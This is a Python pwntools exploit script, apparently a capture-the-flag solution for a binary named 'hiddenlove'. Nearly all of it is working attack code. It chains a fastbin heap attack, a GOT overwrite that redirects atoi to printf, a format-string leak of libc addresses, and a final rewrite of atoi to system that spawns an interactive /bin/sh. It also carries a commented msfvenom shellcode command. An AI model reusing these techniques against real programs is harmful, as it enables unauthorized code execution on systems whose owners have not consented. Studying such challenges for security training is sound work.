# fastbin attack
# overwrite got
# fmt


#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-20 03:15:30
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./hiddenlove"
remote_ip = ""
port = 0
rop = ELF(target)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	#gdb.attach(p,"b*0x400B48\nb*0x400A1A\nc")
	#gdb.attach(p,"b*0x4008f4\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

# stage 0
ru("t her feet\n")
sl("4")
ru("s for her?(Y/N)\n")
sd("a"*(0x1000-0x20)+p64(0)+p64(0x71))

## stage 1
ru("t her feet\n")
sl("1")
ru(" her(0~1000)\n")
sl(str(0x20))
ru("\n")
sd("a")
ru("\n")
sd("\x00"*8)

def edit(addr,data):
	## stage 2
	ru("t her feet\n")
	sl("3")

	## stage 3 
	ru("t her feet\n")
	sl("1")
	ru(" her(0~1000)\n")
	sl(str(0x60))
	ru("\n")
	sd(p64(0)*4+p64(0x100)+p64(0)+p64(addr))
	ru("\n")
	sd("b")


	# stage 4
	ru("t her feet\n")
	sl("2")
	ru("lings\n")

	sd(data)


payload = p64(rop.symbols["free"]+0x6) 
payload +=p64(rop.symbols["puts"]+0x6)
payload +=p64(rop.symbols["__stack_chk_fail"]+0x6)
payload +=p64(rop.symbols["setbuf"]+0x6)
payload +=p64(rop.symbols["printf"]+0x6) 
payload +=p64(rop.symbols["alarm"]+0x6)
payload +=p64(rop.symbols["read"]+0x6)
payload +=p64(rop.symbols["__libc_start_main"]+0x6)
payload +=p64(rop.symbols["malloc"]+0x6)
payload +=p64(rop.symbols["printf"]+0x6)# change atoi to printf (we can use fmt to leak address
payload +=p64(rop.symbols["__isoc99_scanf"]+0x6)
payload +=p64(rop.symbols["alarm"]+0x6) # change exit to alarm


edit(rop.got["free"],payload)

# leak

ru("feet\n")
sd("%7$s...."+p64(rop.got["puts"]))
puts_addr = u64(ru("...")[:6].ljust(8,"\x00"))# read(0,buf,0x10)

ru("feet\n")
sd("%7$s...."+p64(rop.got["printf"]))# dl_reslove change printf_got
printf_addr = u64(ru("...")[:6].ljust(8,"\x00"))


print "puts_addr="+hex(puts_addr)
print "printf_addr="+hex(printf_addr)

system_addr = puts_addr-(libc.symbols["puts"]-libc.symbols["system"])
print "system_addr="+hex(system_addr)


# change atoi to system

payload = p64(rop.symbols["free"]+0x6) 
payload +=p64(rop.symbols["puts"]+0x6)
payload +=p64(rop.symbols["__stack_chk_fail"]+0x6)
payload +=p64(rop.symbols["setbuf"]+0x6)
payload +=p64(rop.symbols["printf"]+0x6) 
payload +=p64(rop.symbols["alarm"]+0x6)
payload +=p64(rop.symbols["read"]+0x6)
payload +=p64(rop.symbols["__libc_start_main"]+0x6)
payload +=p64(rop.symbols["malloc"]+0x6)
payload +=p64(system_addr)# change atoi to printf (we can use fmt to leak address
payload +=p64(rop.symbols["__isoc99_scanf"]+0x6)
payload +=p64(rop.symbols["alarm"]+0x6) # change exit to alarm


sd("aa") # I have changed atoi to printf,so it return the number of my input chars
ru("lings\n")
sd(payload)

ru("feet\n")
sd("/bin/sh\x00")

p.interactive()

# it's a funny pwn ~~~
